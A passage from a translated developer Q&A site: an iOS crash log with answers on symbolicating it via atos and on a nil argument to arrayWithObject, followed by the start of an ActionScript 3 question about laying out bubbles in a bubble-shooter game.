got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/system/libsystem_kernel.dylib, base address 30778000
got symbolicator for /Users/my/Desktop/myApp.app/myApp, base address 1000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/System/Library/PrivateFrameworks/GraphicsServices.framework/GraphicsServices, base address 35f5d000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation, base address 37a6f000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/libc++abi.dylib, base address 3719d000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/System/Library/Frameworks/UIKit.framework/UIKit, base address 308fe000
got symbolicator for /Users/my/Library/Developer/Xcode/iOS DeviceSupport/5.1.1 (9B206)/Symbols/usr/lib/system/libsystem_c.dylib, base address 32ccd000
Incident Identifier: FAA5BAF1-....
CrashReporter Key:   b385d67....
Hardware Model:      iPad3,1
Process:         myApp [1262]
Path:            /var/mobile/Applications/094A6965-AA00-421E-A3CE-98CF2F275362/myApp.app/myApp
Identifier:      myApp
Version:         ??? (???)
Code Type:       ARM (Native)
Parent Process:  launchd [1]

Date/Time:       2012-07-05 01:46:59.281 +0430
OS Version:      iPhone OS 5.1.1 (9B206)
Report Version:  104

Exception Type:  EXC_CRASH (SIGABRT)
Exception Codes: 0x00000000, 0x00000000
Crashed Thread:  0

Last Exception Backtrace:
0   CoreFoundation                  0x37c7888f __exceptionPreprocess + 163
1   libobjc.A.dylib                 0x32fa9259 objc_exception_throw + 33
2   CoreFoundation                  0x37bca9e9 -[__NSPlaceholderArray initWithObjects:count:] + 129
3   CoreFoundation                  0x37bcce79 +[NSArray arrayWithObject:] + 45
4   myApp                           0x000198f5 -[FirstViewController fetchEventsForThisMonth::] (FirstViewController.m:4524)
5   myApp                           0x0000620b -[FirstViewController matrixGenerator] (FirstViewController.m:1255)
6   myApp                           0x000058e1 -[FirstViewController viewDidLoad] (FirstViewController.m:1084)
7   UIKit                           0x30a8ac8b -[UIViewController view] + 167
8   UIKit                           0x30a971e9 -[UIViewController contentScrollView] + 25
9   UIKit                           0x30a97059 -[UINavigationController _computeAndApplyScrollContentInsetDeltaForViewController:] + 37
10  UIKit                           0x30a96f3f -[UINavigationController _layoutViewController:] + 35
11  UIKit                           0x30a967c1 -[UINavigationController _startTransition:fromViewController:toViewController:] + 501
12  UIKit                           0x30a96503 -[UINavigationController _startDeferredTransitionIfNeeded] + 251
13  UIKit                           0x30a963c3 -[UILayoutContainerView layoutSubviews] + 179
14  UIKit                           0x30a54f15 -[UIView(CALayerDelegate) layoutSublayersOfLayer:] + 149
15  CoreFoundation                  0x37bd71fb -[NSObject performSelector:withObject:] + 43
16  QuartzCore                      0x3306caa5 -[CALayer layoutSublayers] + 217
17  QuartzCore                      0x3306c6bd CA::Layer::layout_if_needed(CA::Transaction*) + 217
18  QuartzCore                      0x33070843 CA::Context::commit_transaction(CA::Transaction*) + 227
19  QuartzCore                      0x3307057f CA::Transaction::commit() + 315
20  QuartzCore                      0x33098911 CA::Transaction::flush() + 45
21  QuartzCore                      0x330988e3 +[CATransaction flush] + 35
22  UIKit                           0x30a5ffb1 _afterCACommitHandler + 53
23  CoreFoundation                  0x37c4cb1b __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 19
24  CoreFoundation                  0x37c4ad57 __CFRunLoopDoObservers + 259
25  CoreFoundation                  0x37c4b0b1 __CFRunLoopRun + 761
26  CoreFoundation                  0x37bce4a5 CFRunLoopRunSpecific + 301
27  CoreFoundation                  0x37bce36d CFRunLoopRunInMode + 105
28  GraphicsServices                0x360b1439 GSEventRunModal + 137
29  UIKit                           0x30a7fcd5 UIApplicationMain + 1081
30  myApp                           0x000028fb main (main.m:13)
31  myApp                           0x000028b4 0x1000 + 6324

Thread 0 name:  Dispatch queue: com.apple.main-thread
Thread 0 Crashed:
0   libsystem_kernel.dylib          0x308d932c __pthread_kill + 8
1   libsystem_c.dylib               0x32e6a208 pthread_kill + 48
2   libsystem_c.dylib               0x32e63298 abort + 88
3   libc++abi.dylib                 0x372f3f64 abort_message + 40
4   libc++abi.dylib                 0x372f1346 _ZL17default_terminatev + 18
5   libobjc.A.dylib                 0x32fa9350 _objc_terminate + 140
6   libc++abi.dylib                 0x372f13be _ZL19safe_handler_callerPFvvE + 70
7   libc++abi.dylib                 0x372f144a std::terminate() + 14
8   libc++abi.dylib                 0x372f281e __cxa_rethrow + 82
9   libobjc.A.dylib                 0x32fa92a2 objc_exception_rethrow + 6
10  CoreFoundation                  0x37bce506 CFRunLoopRunSpecific + 398
11  CoreFoundation                  0x37bce366 CFRunLoopRunInMode + 98
12  GraphicsServices                0x360b1432 GSEventRunModal + 130
13  UIKit                           0x30a7fcce UIApplicationMain + 1074
14  myApp                           0x000028f4 main (main.m:13)
15  myApp                           0x000028ac 0x1000 + 6316

Thread 1 name:  Dispatch queue: com.apple.libdispatch-manager
Thread 1:
0   libsystem_kernel.dylib          0x308c93a8 kevent + 24
1   libdispatch.dylib               0x345a3f04 _dispatch_mgr_invoke + 708
2   libdispatch.dylib               0x345a3c22 _dispatch_mgr_thread + 30

Thread 2 name:  WebThread
Thread 2:
0   libsystem_kernel.dylib          0x308c9004 mach_msg_trap + 20
1   libsystem_kernel.dylib          0x308c91fa mach_msg + 50
2   CoreFoundation                  0x37c4c3ec __CFRunLoopServiceMachPort + 120
3   CoreFoundation                  0x37c4b124 __CFRunLoopRun + 876
4   CoreFoundation                  0x37bce49e CFRunLoopRunSpecific + 294
5   CoreFoundation                  0x37bce366 CFRunLoopRunInMode + 98
6   WebCore                         0x31056c9c _ZL12RunWebThreadPv + 396
7   libsystem_c.dylib               0x32e2b72e _pthread_start + 314
8   libsystem_c.dylib               0x32e2b5e8 thread_start + 0

Thread 3:
0   libsystem_kernel.dylib          0x308d9cd4 __workq_kernreturn + 8
1   libsystem_c.dylib               0x32e25f36 _pthread_wqthread + 610
2   libsystem_c.dylib               0x32e25cc8 start_wqthread + 0

Thread 0 crashed with ARM Thread State:
    r0: 0x00000000    r1: 0x00000000      r2: 0x00000001      r3: 0x00000000
    r4: 0x00000006    r5: 0x3e7a5d98      r6: 0x00000002      r7: 0x2fdffa48
    r8: 0x01044600    r9: 0x00000000     r10: 0x00472830     r11: 0x000431fc
    ip: 0x00000148    sp: 0x2fdffa3c      lr: 0x32e6a20f      pc: 0x308d932c
  cpsr: 0x00010010

Binary Images:
    0x1000 -    0x3afff +myApp armv7  <feef5c2f58ac34c09926a37b8c1ae2dd> /var/mobile/Applications/094A6965-AA00-421E-A3CE-98CF2F275362/myApp.app/myApp
0x2fe41000 - 0x2fe62fff  dyld armv7  <77eddfd654df393ba9c95ff01715fd08> /usr/lib/dyld
0x30157000 - 0x30157fff  vecLib armv7  <a2cfe25e77aa36bfb4a30b2d0d2dd465> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/vecLib
0x30229000 - 0x30301fff  vImage armv7  <caf3648be2933384b6aa1ae7408ab4f0> /System/Library/Frameworks/Accelerate.framework/Frameworks/vImage.framework/vImage
0x30332000 - 0x3033cfff  libvMisc.dylib armv7  <e8248c797b9b363594bb652ddf7ce16d> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libvMisc.dylib
0x303b4000 - 0x30411fff  StoreServices armv7  <6ce256d3cf433e4aa1af8d696bf1f75d> /System/Library/PrivateFrameworks/StoreServices.framework/StoreServices
0x30412000 - 0x306d3fff  libLAPACK.dylib armv7  <0e94e9a7e7a334649afaccae0f1215a2> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libLAPACK.dylib
0x306e5000 - 0x306edfff  MobileWiFi armv7  <b76c3e9fb78234c392058250d4620e72> /System/Library/PrivateFrameworks/MobileWiFi.framework/MobileWiFi
0x306f0000 - 0x30715fff  OpenCL armv7  <f4b08361179a3f6bb033415b0d7c6251> /System/Library/PrivateFrameworks/OpenCL.framework/OpenCL
0x30762000 - 0x30762fff  libCVMSPluginSupport.dylib armv7  <a80aaa9989483ce3a496a061fd1e9e0a> /System/Library/Frameworks/OpenGLES.framework/libCVMSPluginSupport.dylib
0x308c8000 - 0x308defff  libsystem_kernel.dylib armv7  <311f379a9fde305d80c1b22b7dd2e52a> /usr/lib/system/libsystem_kernel.dylib
0x30924000 - 0x30935fff  DataAccessExpress armv7  <e6144ba265da3bb7b9a263aa1a29b054> /System/Library/PrivateFrameworks/DataAccessExpress.framework/DataAccessExpress
0x30936000 - 0x309e3fff  libxml2.2.dylib armv7  <58d47f064e0232119f4b838ad659f9c1> /usr/lib/libxml2.2.dylib
0x309e4000 - 0x309fafff  EAP8021X armv7  <952fcfdec0633aff923768fca1a26fcb> /System/Library/PrivateFrameworks/EAP8021X.framework/EAP8021X
0x30a4e000 - 0x30ef0fff  UIKit armv7  <cd513a2f22f53d698c3e10f6fe48a63e> /System/Library/Frameworks/UIKit.framework/UIKit
0x30f6e000 - 0x30fa9fff  libCGFreetype.A.dylib armv7  <55941c96cf1f3b048e72a148c4496c16> /System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib
0x30fad000 - 0x3176cfff  WebCore armv7  <2690c38c9c5f3c09975d619dd1dfbed7> /System/Library/PrivateFrameworks/WebCore.framework/WebCore
0x317d1000 - 0x3191afff  libicucore.A.dylib armv7  <b70646b63f1f3b33896dd8cb91b8dab1> /usr/lib/libicucore.A.dylib
0x31ad6000 - 0x31b27fff  libstdc++.6.dylib armv7  <c352af5a742e3c7a8d4d7e5f6f454793> /usr/lib/libstdc++.6.dylib
0x31c72000 - 0x31c77fff  libcopyfile.dylib armv7  <52e874396c393ed29099789ce702cfe2> /usr/lib/system/libcopyfile.dylib
0x31c78000 - 0x31e1efff  CoreData armv7  <b0215b6d4d143859a2b313ecade095ec> /System/Library/Frameworks/CoreData.framework/CoreData
0x31ebf000 - 0x31ec2fff  libsystem_network.dylib armv7  <356cb66612e836968ef24e6e5c3364cc> /usr/lib/system/libsystem_network.dylib
0x31ec3000 - 0x31f08fff  GeoServices armv7  <a26be2e76e8730ab91a16502aba376be> /System/Library/PrivateFrameworks/GeoServices.framework/GeoServices
0x31f10000 - 0x31f1cfff  CoreVideo armv7  <364fa32d513f3c11b50970120545f1a8> /System/Library/Frameworks/CoreVideo.framework/CoreVideo
0x31f1f000 - 0x31f54fff  SystemConfiguration armv7  <4464a4e3bb3f32f7abaa35ebf31fda49> /System/Library/Frameworks/SystemConfiguration.framework/SystemConfiguration
0x31fdf000 - 0x31fdffff  liblangid.dylib armv7  <644ff4bcfbf337b5b5859e3f0fc0a9a8> /usr/lib/liblangid.dylib
0x31fe0000 - 0x31ffffff  libSystem.B.dylib armv7  <0c55744b6f7335eebba4ca2c3d10b43c> /usr/lib/libSystem.B.dylib
0x3225e000 - 0x3225ffff  libsystem_blocks.dylib armv7  <9fdc27af7350323bbc7d98e14e027907> /usr/lib/system/libsystem_blocks.dylib
0x32260000 - 0x32263fff  libcompiler_rt.dylib armv7  <b2c05d8601c13be884097192dca4e187> /usr/lib/system/libcompiler_rt.dylib
0x323e4000 - 0x3241cfff  VideoToolbox armv7  <9f25f38d1cd13a1daff99cfde8884410> /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
0x32863000 - 0x328a2fff  QuickLook armv7  <802b1092542a3017a0380632502610d4> /System/Library/Frameworks/QuickLook.framework/QuickLook
0x328e1000 - 0x32924fff  libcommonCrypto.dylib armv7  <95b49daf4cf038b6bea8010bba3a1e26> /usr/lib/system/libcommonCrypto.dylib
0x32ad2000 - 0x32ae3fff  libxpc.dylib armv7  <ccf25b1e49ce3b2fa58d8c8546755505> /usr/lib/system/libxpc.dylib
0x32b7f000 - 0x32b83fff  libcache.dylib armv7  <d6a7436ed8dc33d795c9b42baf864882> /usr/lib/system/libcache.dylib
0x32b87000 - 0x32bc3fff  iCalendar armv7  <f2836083051132d3aa40ad82d7f73aea> /System/Library/PrivateFrameworks/iCalendar.framework/iCalendar
0x32ce2000 - 0x32ceefff  libCRFSuite.dylib armv7  <bdb2b4d1a78c39c1ba60d791207aed2a> /usr/lib/libCRFSuite.dylib
0x32cfc000 - 0x32cfffff  libmacho.dylib armv7  <e52b77623bd031bc807e77029566c777> /usr/lib/system/libmacho.dylib
0x32d09000 - 0x32da2fff  EventKit armv7  <d67aa1508ee7306b8e2a45c76ffddff0> /System/Library/Frameworks/EventKit.framework/EventKit
0x32da3000 - 0x32e1cfff  ProofReader armv7  <6db611d8df6530d480f97a40bc519f70> /System/Library/PrivateFrameworks/ProofReader.framework/ProofReader
0x32e1d000 - 0x32ea9fff  libsystem_c.dylib armv7  <f859ce1ad1773f0ba98d7c6e135b7697> /usr/lib/system/libsystem_c.dylib
0x32eaa000 - 0x32eabfff  libdyld.dylib armv7  <977b0ad6f2f433108b4a0324a57cd2ab> /usr/lib/system/libdyld.dylib
0x32f11000 - 0x32f15fff  libGFXShared.dylib armv7  <998fccc16cf735dbb62324202995e193> /System/Library/Frameworks/OpenGLES.framework/libGFXShared.dylib
0x32fa0000 - 0x33066fff  libobjc.A.dylib armv7  <90014d1bc583366d85622e43097df416> /usr/lib/libobjc.A.dylib
0x33067000 - 0x33158fff  QuartzCore armv7  <35d64a9da5523ae08c9e41511fd3061b> /System/Library/Frameworks/QuartzCore.framework/QuartzCore
0x33159000 - 0x3315ffff  liblockdown.dylib armv7  <9e45ce468a6f31e5b8263f2c224aa800> /usr/lib/liblockdown.dylib
0x33330000 - 0x3335cfff  libtidy.A.dylib armv7  <3aacc5b650e037c086a8ff6657d154bf> /usr/lib/libtidy.A.dylib
0x3337e000 - 0x33382fff  libAccessibility.dylib armv7  <9a17d07b5a3b38cfafdf16f78c99b572> /usr/lib/libAccessibility.dylib
0x333c7000 - 0x3342afff  IMCore armv7  <046b6b615a743057b59d4aaba8a91d61> /System/Library/PrivateFrameworks/IMCore.framework/IMCore
0x3342b000 - 0x33434fff  libMobileGestalt.dylib armv7  <4a15e845dc6f3a4a980de66c1cc44c42> /usr/lib/libMobileGestalt.dylib
0x33454000 - 0x3349efff  libvDSP.dylib armv7  <441b42aca07b3da39feab25f8349918f> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libvDSP.dylib
0x33516000 - 0x3351cfff  libnotify.dylib armv7  <9406297de3e43742887890662a87ab53> /usr/lib/system/libnotify.dylib
0x33521000 - 0x336defff  ImageIO armv7  <02e3578171fa3b6a969b244275fd2bab> /System/Library/Frameworks/ImageIO.framework/ImageIO
0x337e0000 - 0x337f9fff  libRIP.A.dylib armv7  <1828cddc5dd93c61afbefb59587d7f8a> /System/Library/Frameworks/CoreGraphics.framework/Resources/libRIP.A.dylib
0x33caa000 - 0x33d02fff  CoreAudio armv7  <be335e8eb6f93594b028a6ddd503a183> /System/Library/Frameworks/CoreAudio.framework/CoreAudio
0x33dd0000 - 0x33ddffff  SpringBoardServices armv7  <a2363f8ed49932dba415d2d4cd32fb74> /System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices
0x33e03000 - 0x33e05fff  MobileInstallation armv7  <215d93dbb0f63cbf828f9126eb7b5349> /System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation
0x33e94000 - 0x33ed0fff  IMFoundation armv7  <253125b9103c3d13b66923ac6893c25b> /System/Library/PrivateFrameworks/IMCore.framework/Frameworks/IMFoundation.framework/IMFoundation
0x3426d000 - 0x34451fff  AudioToolbox armv7  <c91e27850452330ea804db6408840fd2> /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
0x3445b000 - 0x34549fff  libiconv.2.dylib armv7  <2cfefe2ad1d335dd9549562910e7a2e2> /usr/lib/libiconv.2.dylib
0x3454d000 - 0x34561fff  PersistentConnection armv7  <54091a638f8731cd85ccf00fa06972c3> /System/Library/PrivateFrameworks/PersistentConnection.framework/PersistentConnection
0x345a0000 - 0x345b6fff  libdispatch.dylib armv7  <9ecfaef4110a3bf9a92d12f0fe8d1d78> /usr/lib/system/libdispatch.dylib
0x345b7000 - 0x345bbfff  FTClientServices armv7  <21de970d7ebb3e7fb502a0a5451b0806> /System/Library/PrivateFrameworks/FTClientServices.framework/FTClientServices
0x346cd000 - 0x346cefff  libremovefile.dylib armv7  <402f8956975d3b6fb86ab9b31a43242c> /usr/lib/system/libremovefile.dylib
0x34a05000 - 0x34a25fff  libxslt.1.dylib armv7  <39348471007e39dab80af68b08390456> /usr/lib/libxslt.1.dylib
0x34a26000 - 0x34ad4fff  EventKitUI armv7  <bfcf0e8e0f1836619e6d43ca2b0b3230> /System/Library/Frameworks/EventKitUI.framework/EventKitUI
0x34b3c000 - 0x34bbbfff  libsqlite3.dylib armv7  <bf01f5ed47b033d8bde30d735ff44416> /usr/lib/libsqlite3.dylib
0x34bea000 - 0x34beefff  AggregateDictionary armv7  <3a3a33f3a05538988c6e2bb363dc46a8> /System/Library/PrivateFrameworks/AggregateDictionary.framework/AggregateDictionary
0x34c9e000 - 0x34cbbfff  libsystem_info.dylib armv7  <50863bcbf478323e96a8e5b1a83ea6f9> /usr/lib/system/libsystem_info.dylib
0x34e1f000 - 0x34e22fff  NetworkStatistics armv7  <7848d8ebad99367cb4f7f4e3fe88e5d6> /System/Library/PrivateFrameworks/NetworkStatistics.framework/NetworkStatistics
0x34e91000 - 0x34e91fff  libgcc_s.1.dylib armv7  <eb82984fa36c329387aa518aa5205f3d> /usr/lib/libgcc_s.1.dylib
0x34eb0000 - 0x34eeefff  IOKit armv7  <fcda71d29d6136dfbd84c1725f4998e5> /System/Library/Frameworks/IOKit.framework/Versions/A/IOKit
0x34eef000 - 0x34eeffff  libunwind.dylib armv7  <e0a73a57795f3e1698a52ebe6fc07005> /usr/lib/system/libunwind.dylib
0x350e8000 - 0x3518efff  AddressBookUI armv7  <da424fecc66e3628ab03378ae80b38fc> /System/Library/Frameworks/AddressBookUI.framework/AddressBookUI
0x35772000 - 0x35778fff  liblaunch.dylib armv7  <aa2bcba6fc7a36a191958fef2e995475> /usr/lib/system/liblaunch.dylib
0x35779000 - 0x357b0fff  Security armv7  <eea56f71fde83c2981f9281dc7823725> /System/Library/Frameworks/Security.framework/Security
0x35821000 - 0x35844fff  Bom armv7  <c3435ecd2e5839f89de51edad0e1bb00> /System/Library/PrivateFrameworks/Bom.framework/Bom
0x35845000 - 0x35869fff  PrintKit armv7  <08509c7bc915358b953de6f5cbef5c56> /System/Library/PrivateFrameworks/PrintKit.framework/PrintKit
0x3586a000 - 0x358b2fff  CoreMedia armv7  <e274e1b894753b2eb05cf7b22a36d0c1> /System/Library/Frameworks/CoreMedia.framework/CoreMedia
0x358b3000 - 0x358fffff  CoreTelephony armv7  <b8f80d5d594c31d2b5d8fba9fdedb7e1> /System/Library/Frameworks/CoreTelephony.framework/CoreTelephony
0x35900000 - 0x35904fff  IOMobileFramebuffer armv7  <42dbc26828e934acabb4f3b0a35d8250> /System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer
0x35908000 - 0x3590cfff  IOSurface armv7  <443ac3aab9283da480dd9dcda3c5c88e> /System/Library/PrivateFrameworks/IOSurface.framework/IOSurface
0x35943000 - 0x35945fff  libCoreVMClient.dylib armv7  <d4d4aa3090c83e87bcb15ed00b93fd5c> /System/Library/Frameworks/OpenGLES.framework/libCoreVMClient.dylib
0x35946000 - 0x35949fff  CaptiveNetwork armv7  <f5cc4b97ce9432da9426f12621453325> /System/Library/PrivateFrameworks/CaptiveNetwork.framework/CaptiveNetwork
0x35963000 - 0x359a0fff  FTServices armv7  <3f23418319a03a589dd5cac7df20e238> /System/Library/PrivateFrameworks/FTServices.framework/FTServices
0x35b27000 - 0x35b70fff  AddressBook armv7  <b17a2962e9043e0385c3c2c652155f2b> /System/Library/Frameworks/AddressBook.framework/AddressBook
0x35b74000 - 0x35b7ffff  AccountSettings armv7  <373e59421d983c93931cfbad87b1ae35> /System/Library/PrivateFrameworks/AccountSettings.framework/AccountSettings
0x35c69000 - 0x35ca9fff  libGLImage.dylib armv7  <40448706190031f6b0d9636cc11ee81d> /System/Library/Frameworks/OpenGLES.framework/libGLImage.dylib
0x35e5c000 - 0x35f33fff  CFNetwork armv7  <765a472c824830eea91b8f02d12867e4> /System/Library/Frameworks/CFNetwork.framework/CFNetwork
0x3609b000 - 0x360a5fff  libbz2.1.0.dylib armv7  <40e4045fb79e382b8833707746cf28b1> /usr/lib/libbz2.1.0.dylib
0x360a6000 - 0x360acfff  MobileKeyBag armv7  <e1f06241ef0e3f0aae00f15df572077e> /System/Library/PrivateFrameworks/MobileKeyBag.framework/MobileKeyBag
0x360ad000 - 0x360b7fff  GraphicsServices armv7  <cb64e146a8ee3fda9e80ffae1ccc9c5a> /System/Library/PrivateFrameworks/GraphicsServices.framework/GraphicsServices
0x360b8000 - 0x360c0fff  ProtocolBuffer armv7  <0e846afacf823d2b8c029cc3010a8253> /System/Library/PrivateFrameworks/ProtocolBuffer.framework/ProtocolBuffer
0x360c1000 - 0x360d0fff  OpenGLES armv7  <e80acc691001301e96101bb89d940033> /System/Library/Frameworks/OpenGLES.framework/OpenGLES
0x360d1000 - 0x361f6fff  JavaScriptCore armv7  <2ffc6c87b94434288366bd53765ee267> /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
0x3622b000 - 0x3676ffff  FaceCoreLight armv7  <f326d88709683520b251dc53cb847c11> /System/Library/PrivateFrameworks/FaceCoreLight.framework/FaceCoreLight
0x36775000 - 0x36775fff  Accelerate armv7  <55b24cf91a8b3532bde6733c96f14c08> /System/Library/Frameworks/Accelerate.framework/Accelerate
0x36776000 - 0x3678cfff  DictionaryServices armv7  <6ed2e967136f37d4a4b9b318d6c43b83> /System/Library/PrivateFrameworks/DictionaryServices.framework/DictionaryServices
0x36b4f000 - 0x36b50fff  DataMigration armv7  <d77f0e8f39ee37f5a2ac713a3fd9e693> /System/Library/PrivateFrameworks/DataMigration.framework/DataMigration
0x36b51000 - 0x36bc1fff  CoreImage armv7  <86ac6f5a267637b6b7f8a831dfc7c64b> /System/Library/Frameworks/CoreImage.framework/CoreImage
0x36c07000 - 0x36c0cfff  CrashReporterSupport armv7  <dc11c5c2cbe73a6288a6094ebf5de673> /System/Library/PrivateFrameworks/CrashReporterSupport.framework/CrashReporterSupport
0x36c2e000 - 0x36c2ffff  libsystem_sandbox.dylib armv7  <6a8f2f33c7543808a0f4599101c3b61a> /usr/lib/system/libsystem_sandbox.dylib
0x36c30000 - 0x36c31fff  CoreSurface armv7  <97f871f09f503c98a6371c2b657430d8> /System/Library/PrivateFrameworks/CoreSurface.framework/CoreSurface
0x36d07000 - 0x36d0dfff  MobileIcons armv7  <ed1b46f917903c9b9baaa2be4392dafe> /System/Library/PrivateFrameworks/MobileIcons.framework/MobileIcons
0x36d19000 - 0x36d1dfff  Marco armv7  <8dea3e558fe534ff868fc92e215ce53b> /System/Library/PrivateFrameworks/Marco.framework/Marco
0x36d1e000 - 0x36d67fff  libc++.1.dylib armv7  <5b690e5dd5a43a7fb166ade9fe58a7a4> /usr/lib/libc++.1.dylib
0x36d96000 - 0x36de7fff  CoreText armv7  <5bfac4ee88d03d5b87a1f105abb7756c> /System/Library/Frameworks/CoreText.framework/CoreText
0x36df9000 - 0x36f77fff  Foundation armv7  <c40ddb073142315bb4ebb214343d0b7f> /System/Library/Frameworks/Foundation.framework/Foundation
0x36f78000 - 0x36f8dfff  libresolv.9.dylib armv7  <66f7557fa4b43979b186e00271839fdb> /usr/lib/libresolv.9.dylib
0x371d7000 - 0x37281fff  libBLAS.dylib armv7  <bf822cc1a3243ae7b104cf73ca22d352> /System/Library/Frameworks/Accelerate.framework/Frameworks/vecLib.framework/libBLAS.dylib
0x3728e000 - 0x3728ffff  libdnsinfo.dylib armv7  <9aede8d6579d3430ac39ae5f95cce498> /usr/lib/system/libdnsinfo.dylib
0x372d6000 - 0x372ecfff  libmis.dylib armv7  <258bc92be5823b239b4412dd42cb4807> /usr/lib/libmis.dylib
0x372ed000 - 0x372f4fff  libc++abi.dylib armv7  <bab4dcbfc5943d3fbb637342d35e8045> /usr/lib/libc++abi.dylib
0x373d3000 - 0x3741dfff  ManagedConfiguration armv7  <f1fbb825def23043830a095b953a9c94> /System/Library/PrivateFrameworks/ManagedConfiguration.framework/ManagedConfiguration
0x3741e000 - 0x37421fff  CoreTime armv7  <a398de5ba1e43a11b7008e9bb5a7f6fe> /System/Library/PrivateFrameworks/CoreTime.framework/CoreTime
0x37446000 - 0x37446fff  libkeymgr.dylib armv7  <ebd2dddf55d83cf48a18913968775960> /usr/lib/system/libkeymgr.dylib
0x37447000 - 0x37454fff  libbsm.0.dylib armv7  <750a0de73a733019a77144b805d4d2f8> /usr/lib/libbsm.0.dylib
0x37457000 - 0x37527fff  WebKit armv7  <3c5dd2ec46fe3e189c25bba78ad88fa1> /System/Library/PrivateFrameworks/WebKit.framework/WebKit
0x3752b000 - 0x37567fff  AppSupport armv7  <311eac85b2a433a884dacba77217b49e> /System/Library/PrivateFrameworks/AppSupport.framework/AppSupport
0x37568000 - 0x3756ffff  AssetsLibraryServices armv7  <38132ecfd74b325fb1a4142bab663c19> /System/Library/PrivateFrameworks/AssetsLibraryServices.framework/AssetsLibraryServices
0x3758d000 - 0x37592fff  libsystem_dnssd.dylib armv7  <27bb5462450732e380f5a2c170546e93> /usr/lib/system/libsystem_dnssd.dylib
0x379ea000 - 0x37b2ffff  CoreGraphics armv7  <903545b89a7f311d95100ac7d1d44709> /System/Library/Frameworks/CoreGraphics.framework/CoreGraphics
0x37b30000 - 0x37b3cfff  libz.1.dylib armv7  <36ce86a3dc8c344596c8c325615f374b> /usr/lib/libz.1.dylib
0x37bbf000 - 0x37cd6fff  CoreFoundation armv7  <6d450fe923d7387f8b01845e0edd713d> /System/Library/Frameworks/CoreFoundation.framework/CoreFoundation
0x37cf6000 - 0x37d44fff  CoreLocation armv7  <44550ebedf23334d85441d9743b74e03> /System/Library/Frameworks/CoreLocation.framework/CoreLocation
0x37d6a000 - 0x37d79fff  GenerationalStorage armv7  <d84c3fd0e7bd36e78c256f2f4c5a4e91> /System/Library/PrivateFrameworks/GenerationalStorage.framework/GenerationalStorage
0x37d7a000 - 0x37dbefff  MobileCoreServices armv7  <757226927a873d5492be721908077b48> /System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T10:05:26.967

有趣的线路是：

```
4   myApp                           0x000198f5 0x1000 + 100597
5   myApp                           0x0000620b 0x1000 + 21003
6   myApp                           0x000058e1 0x1000 + 18657 
```

但是您的崩溃报告文件没有符号化。

为此，请转到您的管理器，在“存档”中，单击您的应用并选择已生成 .crash 文件的存档。如果您右键单击“在查找器中显示”，它将显示一个 .xarchive。打开 paquet 并找到 .app 文件。

然后进入你的终端，并执行命令：

```
atos -arch armv7 -o 'pathOfYourAppFile.app'/'nameOfYourApp' 0x000198f5
atos -arch armv7 -o 'pathOfYourAppFile.app'/'nameOfYourApp' 0x0000620b
atos -arch armv7 -o 'pathOfYourAppFile.app'/'nameOfYourApp' 0x000058e1 
```

内存位置对应于崩溃报告的第 4、5 和 6 行。这些命令将为您提供应用程序崩溃的功能。

希望有帮助。

PS：如果你没有归档你的应用程序，你必须找到崩溃设备上安装的.app，但它必须是生成崩溃报告的那个，否则内存插槽关联会错误（它会给出你有一些随机函数！）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T09:57:39.887

正如 David 上面所说，您应该符号化崩溃日志，以便您知道错误发生在哪里。除了它在*哪里*之外，导致此崩溃的最常见原因是您将 nil 值传递给`-arrayWithObject:`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-30T10:22:30.273

在崩溃报告中我看到了这个......

硬件型号：iPad3,1 ....操作系统版本：iPhone OS 5.1.1 (9B206)

这是苹果崩溃报告问题还是用户使用的是越狱的 iOS？

# actionscript-3 - 如何为泡泡龙游戏放置泡泡？AS3.0

> ID：11427208
> 
> 赞同：0
> 
> 时间：2012-07-11T07:00:11.113
> 
> 标签：actionscript-3

我正在使用 ActionScript 3.0 制作泡泡射击游戏，但无法正确放置泡泡。它应该看起来像这样：

```
00000000
 00000000
00000000
 00000000 
```

但我现在只放置第一行和第三行，我不知道我做错了什么。这是我到目前为止的代码：

**bubble_mc：（**这是我的泡泡，有 6 个不同的泡泡）

```
package  {
    import flash.display.MovieClip;
    public class bubble_mc extends MovieClip {
        public function bubble_mc(val:uint,row:uint,col:uint) {
            gotoAndStop(val+1);
            name=row+"_"+col;
            x=50+col*36;
            y=40+row*36;
        }

    }

} 
```

**主要的：**

```
package  {
    import flash.display.Sprite;
    import flash.events.KeyboardEvent;
    import flash.events.Event;
    public class Main extends Sprite {
        private const ROT_SPEED:uint=2;
        private const R:uint=18;
        private const D:Number=R*Math.sqrt(3);
        private var bubbleArr:Array=new Array();
        private var cannon:cannon_mc;
        private var bubble:bubble_mc;
        private var left:Boolean=false;
        private var right:Boolean=false;
        private var bubCont:Sprite;
        public function Main() {
            placeContainer();
            placeCannon();
            stage.addEventListener(KeyboardEvent.KEY_DOWN,onKDown);
            stage.addEventListener(KeyboardEvent.KEY_UP,onKUp);
            addEventListener(Event.ENTER_FRAME,onEFrame);
        }
        private function placeCannon():void {
            cannon=new cannon_mc();
            addChild(cannon);
            cannon.y=385.5;
            cannon.x=320;
        }
        private function onKDown(e:KeyboardEvent):void {
